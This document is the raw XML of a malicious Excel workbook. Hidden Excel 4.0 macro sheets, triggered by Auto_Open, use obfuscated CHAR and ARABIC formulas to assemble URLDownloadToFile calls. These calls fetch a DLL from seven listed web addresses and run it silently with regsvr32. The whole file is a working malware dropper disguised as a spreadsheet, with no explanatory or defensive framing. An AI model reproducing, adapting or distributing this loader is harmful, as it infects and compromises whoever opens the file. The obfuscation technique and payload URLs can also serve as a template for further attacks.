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macrosheets/intlsheet1.xml" ContentType="application/vnd.ms-excel.intlmacrosheet+xml"/>
  <Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>
  <Override PartName="/xl/macrosheets/sheet2.xml" ContentType="application/vnd.ms-excel.macro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/>
  <workbookPr/>
  <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="x15">
      <x15ac:absPath xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac" url="C:\Users\Posik\Desktop\File3\14m\CIR-ZV\NN\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{6A684F69-18CA-4C00-A0F4-C1F83285EC59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Sheet" sheetId="1" r:id="rId1"/>
    <sheet name="Ofgeg" sheetId="2" state="hidden" r:id="rId2"/>
    <sheet name="Vedve" sheetId="3" state="hidden" r:id="rId3"/>
    <sheet name="Urdgv" sheetId="4" state="hidden" r:id="rId4"/>
    <sheet name="EGDGB" sheetId="5" state="hidden" r:id="rId5"/>
    <sheet name="Tfv" sheetId="6" state="hidden" r:id="rId6"/>
    <sheet name="Tfvv" sheetId="7" state="hidden" r:id="rId7"/>
  </sheets>
  <definedNames>
    <definedName name="BFVS1">EGDGB!$F$7</definedName>
    <definedName name="BFVS2">EGDGB!$F$9</definedName>
    <definedName name="BFVS3">EGDGB!$F$11</definedName>
    <definedName name="BFVS4">EGDGB!$F$13</definedName>
    <definedName name="BFVS5">EGDGB!$F$15</definedName>
    <definedName name="BFVS6">EGDGB!$F$17</definedName>
    <definedName name="BFVS7">EGDGB!$F$19</definedName>
    <definedName name="_xlnm.Auto_Open">EGDGB!$F$1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6" i="3" l="1"/>
  <c r="H13" i="3"/>
  <c r="N16" i="3"/>
  <c r="P12" i="3"/>
  <c r="E10" i="3"/>
  <c r="K37" i="2"/>
  <c r="Q36" i="2"/>
  <c r="E35" i="2"/>
  <c r="O33" i="2"/>
  <c r="I32" i="2"/>
  <c r="I26" i="2"/>
  <c r="G24" i="2"/>
  <c r="K23" i="2"/>
  <c r="P22" i="2"/>
  <c r="P20" i="2"/>
  <c r="P19" i="2"/>
  <c r="B18" i="2"/>
  <c r="P17" i="2"/>
  <c r="I17" i="2"/>
  <c r="D17" i="2"/>
  <c r="P15" i="2"/>
  <c r="F15" i="2"/>
  <c r="B15" i="2"/>
  <c r="K14" i="2"/>
  <c r="G14" i="2"/>
  <c r="P13" i="2"/>
  <c r="H13" i="2"/>
  <c r="D13" i="2"/>
  <c r="A12" i="2"/>
  <c r="P11" i="2"/>
  <c r="L11" i="2"/>
  <c r="J11" i="2"/>
  <c r="E11" i="2"/>
  <c r="F10" i="2"/>
  <c r="P9" i="2"/>
  <c r="K9" i="2"/>
  <c r="H9" i="2"/>
  <c r="C9" i="2"/>
  <c r="P7" i="2"/>
  <c r="M7" i="2"/>
  <c r="D7" i="2"/>
  <c r="J6" i="2"/>
  <c r="E6" i="2"/>
  <c r="P5" i="2"/>
  <c r="B5" i="2"/>
  <c r="N4" i="2"/>
  <c r="H4" i="2"/>
  <c r="F4" i="2"/>
  <c r="P3" i="2"/>
  <c r="I3" i="2"/>
  <c r="C3" i="2"/>
  <c r="L2" i="2"/>
  <c r="G2" i="2"/>
  <c r="E2" i="2"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="19" uniqueCount="19">
  <si>
    <t>-</t>
  </si>
  <si>
    <t>G</t>
  </si>
  <si>
    <t>!</t>
  </si>
  <si>
    <t>/</t>
  </si>
  <si>
    <t>regsvr32.exe</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;0, </t>
  </si>
  <si>
    <t>SysWow64\</t>
  </si>
  <si>
    <t>\Windows\</t>
  </si>
  <si>
    <t>",0,0)</t>
  </si>
  <si>
    <t>,0,</t>
  </si>
  <si>
    <t>..\ujg.dll</t>
  </si>
  <si>
    <t xml:space="preserve"> ..\ujg.dll</t>
  </si>
  <si>
    <t>"https://www.ankeoman.com/undercons_files/l88ETG/","</t>
  </si>
  <si>
    <t>"http://atbiotique.com/images/Luf2JK8NAHSkvg3H83g/","</t>
  </si>
  <si>
    <t>"http://atacelikyapi.com/css/SOiiHs8wmjzlWoO/","</t>
  </si>
  <si>
    <t>"http://atsyemek.com/test/QaMcxcqLPFHX/","</t>
  </si>
  <si>
    <t>"http://atozams.com/app/d24BUaSin4NuT/","</t>
  </si>
  <si>
    <t>"http://aureadesign.net/1U3/","</t>
  </si>
  <si>
    <t>"http://www.anzizasalema.com/cms/wX6lkpSHjeEPO81/","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</si>
</sst>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9B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1" fillId="2" borderId="0" xfId="0" applyFont="1" applyFill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microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet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xlMacrosheet" Target="macrosheets/sheet1.xml"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/calcChain" Target="calcChain.xml"/><Relationship Id="rId5" Type="http://schemas.microsoft.com/office/2006/relationships/xlIntlMacrosheet" Target="macrosheets/intlsheet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16</xdr:col>
      <xdr:colOff>517766</xdr:colOff>
      <xdr:row>1</xdr:row>
      <xdr:rowOff>19050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8C5470F5-FECA-4694-939B-C4707E7038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0271366" cy="276225"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
      </xdr:spPr>
    </xdr:pic>
    <xdr:clientData/>
  </xdr:twoCellAnchor>
</xdr:wsDr>
</file>

<file path=xl/macrosheets/_rels/intl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macrosheets/intl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95F81A95-6AB4-4EC2-B5CB-9615963B95C2}">
  <dimension ref="F5"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultColWidth="6.85546875" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="6.85546875" style="1"/>
  </cols>
  <sheetData>
    <row r="5" spans="6:6" x14ac:dyDescent="0.25">
      <c r="F5" s="1" t="b">
        <f>FORMULA(Tfv!D14,Tfvv!I12)=FORMULA(Ofgeg!P22&amp;Ofgeg!H9&amp;Ofgeg!L2&amp;Ofgeg!B15&amp;Ofgeg!B15&amp;Vedve!E10&amp;Vedve!H13&amp;Ofgeg!F10&amp;Vedve!J6&amp;Tfvv!I12&amp;Ofgeg!L2&amp;Vedve!P12&amp;Urdgv!K22&amp;Vedve!E18&amp;Urdgv!T20&amp;Urdgv!G21,F7)=FORMULA(Ofgeg!P22&amp;Ofgeg!J11&amp;Ofgeg!B18&amp;Ofgeg!P11&amp;"BFVS1"&amp;Urdgv!R10&amp;Ofgeg!H9&amp;Ofgeg!L2&amp;Ofgeg!B15&amp;Ofgeg!B15&amp;Vedve!E10&amp;Vedve!H13&amp;Ofgeg!F10&amp;Vedve!J6&amp;Tfvv!I12&amp;Ofgeg!L2&amp;Vedve!P12&amp;Urdgv!K22&amp;Vedve!F20&amp;Urdgv!T20&amp;Urdgv!G21&amp;Ofgeg!P13,F9)=FORMULA(Ofgeg!P22&amp;Ofgeg!J11&amp;Ofgeg!B18&amp;Ofgeg!P11&amp;"BFVS2"&amp;Urdgv!R10&amp;Ofgeg!H9&amp;Ofgeg!L2&amp;Ofgeg!B15&amp;Ofgeg!B15&amp;Vedve!E10&amp;Vedve!H13&amp;Ofgeg!F10&amp;Vedve!J6&amp;Tfvv!I12&amp;Ofgeg!L2&amp;Vedve!P12&amp;Urdgv!K22&amp;Vedve!G18&amp;Urdgv!T20&amp;Urdgv!G21&amp;Ofgeg!P13,F11)=FORMULA(Ofgeg!P22&amp;Ofgeg!J11&amp;Ofgeg!B18&amp;Ofgeg!P11&amp;"BFVS3"&amp;Urdgv!R10&amp;Ofgeg!H9&amp;Ofgeg!L2&amp;Ofgeg!B15&amp;Ofgeg!B15&amp;Vedve!E10&amp;Vedve!H13&amp;Ofgeg!F10&amp;Vedve!J6&amp;Tfvv!I12&amp;Ofgeg!L2&amp;Vedve!P12&amp;Urdgv!K22&amp;Vedve!H20&amp;Urdgv!T20&amp;Urdgv!G21&amp;Ofgeg!P13,F13)=FORMULA(Ofgeg!P22&amp;Ofgeg!J11&amp;Ofgeg!B18&amp;Ofgeg!P11&amp;"BFVS4"&amp;Urdgv!R10&amp;Ofgeg!H9&amp;Ofgeg!L2&amp;Ofgeg!B15&amp;Ofgeg!B15&amp;Vedve!E10&amp;Vedve!H13&amp;Ofgeg!F10&amp;Vedve!J6&amp;Tfvv!I12&amp;Ofgeg!L2&amp;Vedve!P12&amp;Urdgv!K22&amp;Vedve!I18&amp;Urdgv!T20&amp;Urdgv!G21&amp;Ofgeg!P13,F15)=FORMULA(Ofgeg!P22&amp;Ofgeg!J11&amp;Ofgeg!B18&amp;Ofgeg!P11&amp;"BFVS5"&amp;Urdgv!R10&amp;Ofgeg!H9&amp;Ofgeg!L2&amp;Ofgeg!B15&amp;Ofgeg!B15&amp;Vedve!E10&amp;Vedve!H13&amp;Ofgeg!F10&amp;Vedve!J6&amp;Tfvv!I12&amp;Ofgeg!L2&amp;Vedve!P12&amp;Urdgv!K22&amp;Vedve!J20&amp;Urdgv!T20&amp;Urdgv!G21&amp;Ofgeg!P13,F17)=FORMULA(Ofgeg!P22&amp;Ofgeg!J11&amp;Ofgeg!B18&amp;Ofgeg!P11&amp;"BFVS6"&amp;Urdgv!R10&amp;Ofgeg!H9&amp;Ofgeg!L2&amp;Ofgeg!B15&amp;Ofgeg!B15&amp;Vedve!E10&amp;Vedve!H13&amp;Ofgeg!F10&amp;Vedve!J6&amp;Tfvv!I12&amp;Ofgeg!L2&amp;Vedve!P12&amp;Urdgv!K22&amp;Vedve!K18&amp;Urdgv!T20&amp;Urdgv!G21&amp;Ofgeg!P13,F19)=FORMULA(Ofgeg!P22&amp;Ofgeg!J11&amp;Ofgeg!B18&amp;Ofgeg!P11&amp;"BFVS7"&amp;Urdgv!R10&amp;Ofgeg!H9&amp;Ofgeg!B15&amp;Ofgeg!I17&amp;Ofgeg!I3&amp;Ofgeg!H13&amp;Ofgeg!P11&amp;Ofgeg!K9&amp;Ofgeg!P13&amp;Ofgeg!P7&amp;Ofgeg!P13,F21)=FORMULA(Ofgeg!P22&amp;Ofgeg!H13&amp;Ofgeg!N4&amp;Ofgeg!H13&amp;Ofgeg!H9&amp;Ofgeg!P11&amp;Ofgeg!P15&amp;Ofgeg!H9&amp;Ofgeg!P20&amp;Urdgv!N17&amp;Urdgv!O13&amp;Urdgv!J9&amp;Vedve!N16&amp;Urdgv!H15&amp;Ofgeg!P15&amp;Ofgeg!P13,F23)=FORMULA(Ofgeg!P22&amp;Ofgeg!G24&amp;Ofgeg!H13&amp;Ofgeg!E6&amp;Ofgeg!E11&amp;Ofgeg!G24&amp;Ofgeg!K23&amp;Ofgeg!P11&amp;Ofgeg!P13,F28)</f>
        <v>0</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup paperSize="9" orientation="portrait" r:id="rId1"/>
</xm:macrosheet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15B51173-6781-4859-91A2-62A40D8BB7A6}">
  <dimension ref="D14"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="14" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D14" s="1" t="str">
        <f>CHAR(Ofgeg!K37)</f>
        <v>e</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
</xm:macrosheet>
</file>

<file path=xl/macrosheets/sheet2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6DB79C01-BA9C-464E-8C45-DE2BFA7333FF}">
  <dimension ref="A1"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData/>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.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"/>
  <sheetViews>
    <sheetView tabSelected="1" workbookViewId="0">
      <selection activeCell="AM55" sqref="AM55"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="1" s="2" customFormat="1" ht="20.25" customHeight="1" x14ac:dyDescent="0.2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02AB24-EAA9-49CC-B1A5-C820D20D824E}">
  <dimension ref="A2:Q37"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="2" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E2" s="1" t="str">
        <f>CHAR(113-2)</f>
        <v>o</v>
      </c>
      <c r="G2" s="1" t="str">
        <f>CHAR(111-6)</f>
        <v>i</v>
      </c>
      <c r="L2" s="1" t="str">
        <f>CHAR(71-6)</f>
        <v>A</v>
      </c>
      <c r="P2" s="1" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="3" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C3" s="1" t="str">
        <f>CHAR(111+3)</f>
        <v>r</v>
      </c>
      <c r="I3" s="1" t="str">
        <f>CHAR(87-4)</f>
        <v>S</v>
      </c>
      <c r="P3" s="1" t="str">
        <f>CHAR(90+2)</f>
        <v>\</v>
      </c>
    </row>
    <row r="4" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F4" s="1" t="str">
        <f>CHAR(100-18)</f>
        <v>R</v>
      </c>
      <c r="H4" s="1" t="str">
        <f>CHAR(110-9)</f>
        <v>e</v>
      </c>
      <c r="K4" s="1">
        <v>1</v>
      </c>
      <c r="N4" s="1" t="str">
        <f>CHAR(89-1)</f>
        <v>X</v>
      </c>
    </row>
    <row r="5" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B5" s="1" t="str">
        <f>CHAR(115+2)</f>
        <v>u</v>
      </c>
      <c r="P5" s="1" t="str">
        <f>CHAR(44+2)</f>
        <v>.</v>
      </c>
    </row>
    <row r="6" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E6" s="1" t="str">
        <f>CHAR(90-6)</f>
        <v>T</v>
      </c>
      <c r="J6" s="1" t="str">
        <f>CHAR(77-3)</f>
        <v>J</v>
      </c>
    </row>
    <row r="7" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D7" s="1" t="str">
        <f>CHAR(107+3)</f>
        <v>n</v>
      </c>
      <c r="F7" s="1">
        <v>3</v>
      </c>
      <c r="M7" s="1" t="str">
        <f>CHAR(117-2)</f>
        <v>s</v>
      </c>
      <c r="P7" s="1" t="str">
        <f>CHAR(41+3)</f>
        <v>,</v>
      </c>
    </row>
    <row r="9" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C9" s="1" t="str">
        <f>CHAR(110-2)</f>
        <v>l</v>
      </c>
      <c r="H9" s="1" t="str">
        <f>CHAR(70-3)</f>
        <v>C</v>
      </c>
      <c r="K9" s="1" t="str">
        <f>CHAR(55-7)</f>
        <v>0</v>
      </c>
      <c r="P9" s="1" t="str">
        <f>CHAR(55+5)</f>
        <v>&lt;</v>
      </c>
    </row>
    <row r="10" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F10" s="1" t="str">
        <f>CHAR(123-4)</f>
        <v>w</v>
      </c>
    </row>
    <row r="11" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E11" s="1" t="str">
        <f>CHAR(80+5)</f>
        <v>U</v>
      </c>
      <c r="J11" s="1" t="str">
        <f>CHAR(80-7)</f>
        <v>I</v>
      </c>
      <c r="L11" s="1" t="str">
        <f>CHAR(100-1)</f>
        <v>c</v>
      </c>
      <c r="P11" s="1" t="str">
        <f>CHAR(35+5)</f>
        <v>(</v>
      </c>
    </row>
    <row r="12" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A12" s="1" t="str">
        <f>CHAR(107+2)</f>
        <v>m</v>
      </c>
    </row>
    <row r="13" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D13" s="1" t="str">
        <f>CHAR(72-4)</f>
        <v>D</v>
      </c>
      <c r="H13" s="1" t="str">
        <f>CHAR(68+1)</f>
        <v>E</v>
      </c>
      <c r="N13" s="1">
        <v>2</v>
      </c>
      <c r="P13" s="1" t="str">
        <f>CHAR(36+5)</f>
        <v>)</v>
      </c>
    </row>
    <row r="14" spans="1:16" x14ac:dyDescent="0.25">
      <c r="G14" s="1" t="str">
        <f>CHAR(124-4)</f>
        <v>x</v>
      </c>
      <c r="K14" s="1" t="str">
        <f>CHAR(70-4)</f>
        <v>B</v>
      </c>
    </row>
    <row r="15" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B15" s="1" t="str">
        <f>CHAR(80-4)</f>
        <v>L</v>
      </c>
      <c r="F15" s="1" t="str">
        <f>CHAR(105-5)</f>
        <v>d</v>
      </c>
      <c r="P15" s="1" t="str">
        <f>CHAR(31+3)</f>
        <v>"</v>
      </c>
    </row>
    <row r="17" spans="2:16" x14ac:dyDescent="0.25">
      <c r="D17" s="1" t="str">
        <f>CHAR(102-5)</f>
        <v>a</v>
      </c>
      <c r="I17" s="1" t="str">
        <f>CHAR(78+1)</f>
        <v>O</v>
      </c>
      <c r="K17" s="1" t="s">
        <v>1</v>
      </c>
      <c r="P17" s="1" t="str">
        <f>CHAR(40-2)</f>
        <v>&amp;</v>
      </c>
    </row>
    <row r="18" spans="2:16" x14ac:dyDescent="0.25">
      <c r="B18" s="1" t="str">
        <f>CHAR(65+5)</f>
        <v>F</v>
      </c>
    </row>
    <row r="19" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P19" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
    </row>
    <row r="20" spans="2:16" x14ac:dyDescent="0.25">
      <c r="H20" s="1">
        <v>8</v>
      </c>
      <c r="P20" s="1" t="str">
        <f>CHAR(52+6)</f>
        <v>:</v>
      </c>
    </row>
    <row r="22" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P22" s="1" t="str">
        <f>CHAR(66-5)</f>
        <v>=</v>
      </c>
    </row>
    <row r="23" spans="2:16" x14ac:dyDescent="0.25">
      <c r="K23" s="1" t="str">
        <f>CHAR(80-2)</f>
        <v>N</v>
      </c>
    </row>
    <row r="24" spans="2:16" x14ac:dyDescent="0.25">
      <c r="G24" s="1" t="str">
        <f>CHAR(84-2)</f>
        <v>R</v>
      </c>
      <c r="P24" s="1" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="26" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I26" s="1" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
    </row>
    <row r="27" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P27" s="1" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="32" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I32" s="1">
        <f>_xlfn.ARABIC("CXI")</f>
        <v>111</v>
      </c>
    </row>
    <row r="33" spans="5:17" x14ac:dyDescent="0.25">
      <c r="O33" s="1">
        <f>_xlfn.ARABIC("LXVII")</f>
        <v>67</v>
      </c>
    </row>
    <row r="35" spans="5:17" x14ac:dyDescent="0.25">
      <c r="E35" s="1">
        <f>_xlfn.ARABIC("LXI")</f>
        <v>61</v>
      </c>
    </row>
    <row r="36" spans="5:17" x14ac:dyDescent="0.25">
      <c r="Q36" s="1">
        <f>_xlfn.ARABIC("CXIV")</f>
        <v>114</v>
      </c>
    </row>
    <row r="37" spans="5:17" x14ac:dyDescent="0.25">
      <c r="K37" s="1">
        <f>_xlfn.ARABIC("CI")</f>
        <v>101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CB11A7-A3AD-4D29-8183-8D051886492D}">
  <dimension ref="E6:P20"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="6" spans="5:16" x14ac:dyDescent="0.25">
      <c r="J6" s="1" t="str">
        <f>T(Ofgeg!D7&amp;Ofgeg!C9&amp;Ofgeg!E2&amp;Ofgeg!D17&amp;Ofgeg!F15&amp;Ofgeg!E6&amp;Ofgeg!E2&amp;Ofgeg!B18&amp;Ofgeg!G2&amp;Ofgeg!C9)</f>
        <v>nloadToFil</v>
      </c>
    </row>
    <row r="10" spans="5:16" x14ac:dyDescent="0.25">
      <c r="E10" s="1" t="str">
        <f>T(Ofgeg!P11&amp;Ofgeg!P15&amp;Ofgeg!B5&amp;Ofgeg!C3&amp;Ofgeg!C9&amp;Ofgeg!A12)</f>
        <v>("urlm</v>
      </c>
    </row>
    <row r="12" spans="5:16" x14ac:dyDescent="0.25">
      <c r="P12" s="1" t="str">
        <f>T(Ofgeg!P15&amp;Ofgeg!P7&amp;Ofgeg!P15&amp;Ofgeg!J6&amp;Ofgeg!J6&amp;Ofgeg!H9&amp;Ofgeg!H9&amp;Ofgeg!K14&amp;Ofgeg!K14&amp;Ofgeg!P15)</f>
        <v>","JJCCBB"</v>
      </c>
    </row>
    <row r="13" spans="5:16" x14ac:dyDescent="0.25">
      <c r="H13" s="1" t="str">
        <f>T(Ofgeg!E2&amp;Ofgeg!D7&amp;Ofgeg!P15&amp;Ofgeg!P7&amp;Ofgeg!P15&amp;Ofgeg!E11&amp;Ofgeg!F4&amp;Ofgeg!B15&amp;Ofgeg!D13&amp;Ofgeg!E2)</f>
        <v>on","URLDo</v>
      </c>
    </row>
    <row r="16" spans="5:16" x14ac:dyDescent="0.25">
      <c r="N16" s="1" t="str">
        <f>T(Ofgeg!P19&amp;Ofgeg!P2&amp;Ofgeg!M7)</f>
        <v xml:space="preserve"> -s</v>
      </c>
    </row>
    <row r="18" spans="5:11" x14ac:dyDescent="0.25">
      <c r="E18" s="1" t="s">
        <v>12</v>
      </c>
      <c r="G18" s="1" t="s">
        <v>14</v>
      </c>
      <c r="I18" s="1" t="s">
        <v>16</v>
      </c>
      <c r="K18" s="1" t="s">
        <v>18</v>
      </c>
    </row>
    <row r="20" spans="5:11" x14ac:dyDescent="0.25">
      <c r="F20" s="1" t="s">
        <v>13</v>
      </c>
      <c r="H20" s="1" t="s">
        <v>15</v>
      </c>
      <c r="J20" s="1" t="s">
        <v>17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A55FE-1AE2-4F51-972C-2A45D1831794}">
  <dimension ref="G9:T22"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="9" spans="8:18" x14ac:dyDescent="0.25">
      <c r="J9" s="1" t="s">
        <v>4</v>
      </c>
    </row>
    <row r="10" spans="8:18" x14ac:dyDescent="0.25">
      <c r="R10" s="1" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="13" spans="8:18" x14ac:dyDescent="0.25">
      <c r="O13" s="1" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="15" spans="8:18" x14ac:dyDescent="0.25">
      <c r="H15" s="1" t="s">
        <v>11</v>
      </c>
    </row>
    <row r="17" spans="7:20" x14ac:dyDescent="0.25">
      <c r="N17" s="1" t="s">
        <v>7</v>
      </c>
    </row>
    <row r="20" spans="7:20" x14ac:dyDescent="0.25">
      <c r="T20" s="1" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="21" spans="7:20" x14ac:dyDescent="0.25">
      <c r="G21" s="1" t="s">
        <v>8</v>
      </c>
    </row>
    <row r="22" spans="7:20" x14ac:dyDescent="0.25">
      <c r="K22" s="1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Макросы Excel 4.0</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>3</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="7" baseType="lpstr">
      <vt:lpstr>Sheet</vt:lpstr>
      <vt:lpstr>Ofgeg</vt:lpstr>
      <vt:lpstr>Vedve</vt:lpstr>
      <vt:lpstr>Urdgv</vt:lpstr>
      <vt:lpstr>EGDGB</vt:lpstr>
      <vt:lpstr>Tfv</vt:lpstr>
      <vt:lpstr>Tfvv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Posik</dc:creator>
  <cp:lastModifiedBy>Dettew</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-06-05T18:19:34Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-03-15T08:03:24Z</dcterms:modified>
</cp:coreProperties>
</file>